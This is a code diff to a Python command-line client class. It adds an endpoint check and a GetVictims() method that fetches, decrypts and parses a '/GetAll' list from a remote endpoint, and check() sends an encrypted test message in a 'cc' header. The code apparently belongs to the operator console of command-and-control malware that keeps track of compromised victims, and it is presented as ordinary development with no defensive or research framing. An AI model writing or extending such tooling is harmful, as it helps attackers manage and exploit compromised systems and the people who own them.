@@ -1,6 +1,7 @@
 """CLI core class"""
 from models.encryption import CLIEncryption
 import requests
+import json
 
 
 
@@ -59,6 +60,8 @@ class Core(CLIEncryption):
 
     def check(self) -> bool:
         """Check if the endpoint is reachable and validate the cryptographic parameters."""
+        if self.EndPoint is None:
+            print("[-] The Endpoint URL is missing, You should set it before checking the endpoint.")
         if self.CheckParam() is True:
             TestMessage = self.EncryptBuffer("Are you ready?")
             header = {"cc": TestMessage}
@@ -74,4 +77,17 @@ class Core(CLIEncryption):
             except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                 print("[-] The endpoint is not reqponding, You should verify that the endpoint URL is correct.")
         else:
-            print("[-] The cryptographic parameters are NULL, You should set them or load a setting file before checking the endpoint.")
+            print("[-] The cryptographic parameters are missing, You should set them or load a setting file before checking the endpoint.")
+
+    def GetVictims(self) -> dict:
+        if self.IsReady is True:
+            url = self.EndPoint + "/GetAll"
+
+            try:
+                response = requests.get(url=url)
+                data = self.DecryptBuffer(response.text)
+                return json.loads(data)
+            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
+                print("[-] The endpoint is down.")
+        
+        return None
